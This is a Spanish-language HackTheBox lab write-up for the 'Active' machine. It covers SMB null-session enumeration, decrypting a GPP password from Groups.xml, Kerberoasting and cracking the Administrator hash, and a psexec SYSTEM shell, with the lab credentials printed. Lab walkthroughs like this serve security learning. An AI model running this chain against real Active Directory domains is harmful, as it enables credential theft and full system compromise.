---
layout: ../layouts/SavinoteLayout.astro
title: "HTB_Active"
date: 2023-07-10
slug: HTB_Active
heroImage: /assets/machines.jpg
---

# Active {-}

## Introduccion {-}

La maquina del dia se llama Active.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/kTyYkrK970w/0.jpg)](https://www.youtube.com/watch?v=kTyYkrK970w)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.100
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.100
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,289,445,464,593,636,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.10.10.100 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5722   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 47001  | msrpc      | Puertos por defecto de windows           |                           |
| 49152  | msrpc      | Puertos por defecto de windows           |                           |
| 49153  | msrpc      | Puertos por defecto de windows           |                           |
| 49154  | msrpc      | Puertos por defecto de windows           |                           |
| 49155  | ncacn_http | Puertos por defecto de windows           |                           |
| 49157  | msrpc      | Puertos por defecto de windows           |                           |
| 49158  | msrpc      | Puertos por defecto de windows           |                           |
| 49169  | msrpc      | Puertos por defecto de windows           |                           |
| 49171  | msrpc      | Puertos por defecto de windows           |                           |
| 49182  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.100
smbclient -L 10.10.10.100 -N
smbmap -H 10.10.10.100 -u 'null'
```

Vemos que estamos frente de una maquina Windows 6.1 x64 que se llama **DC** en el dominio **active.htb** con un certificado firmado.
Añadimos el dominio al 
```bash
 /etc/hosts 
```
.
Tambien vemos que podemos ver los recursos compartidos a nivel de red con un null session y que el recurso **Replication** esta en **READ ONLY**.
Listamos el directorio con **smbmap**

```bash
smbmap -H 10.10.10.100 -r Replication
smbmap -H 10.10.10.100 -r Replication/active.htb
```

Aqui vemos

- DfsrPrivate
- Policies
- scripts

Esto nos hace pensar a una replica de **SYSVOL**. Aqui buscamos si esta el 
```bash
 groups.xml 
```


```bash
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/*
```

## Vulnerability Assessment {-}

### Groups.xml {-}

Hemos encontrado el fichero 
```bash
 groups.xml 
```
, lo descargamos

```bash
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml

mv Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04F894F9}/MACHINE/Preferences/Groups/Groups.xml Groups.xml
cat Groups.xml
```

Aqui vemos el usuario y la contraseña encryptada.

```bash
gpp-decrypt "edBSHOwhZLTjt/Q59FeIcJ83mjWA98gw9gukOhjOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

Ya tenemos la contraseña. Verificamos si las credenciales son validas.

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Es valida pero no tenemos el Pwn3d. Miramos si este usuario tiene acceso a mas registros compartidos a nivel de red.

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

Hay unos cuantos mas. Miramos lo que hay en el registro Users

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

Como solo vemos nuestro usuario y el administrator, y quel puerto 88 esta abierto, intentamos un Kerberoasting attack.

### Kerberoasting attack {-}

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

Aqui podemos ver que el usuario Administrator es kerberoasteable.

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

Copiamos el hash y intentamos romperlo con John

### Crack hash with John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya tenemos la contraseña del usuario Administrator. Lo verificamos con crackmapexec

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

Ademas de ser valido, vemos el famoso **(Pwn3d!)**
## Vuln exploit & Gaining Access {-}

### Conexion con psexec {-}


```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
whoami
#Output
nt authority\system
```

Aqui podemos leer las 2 flags.
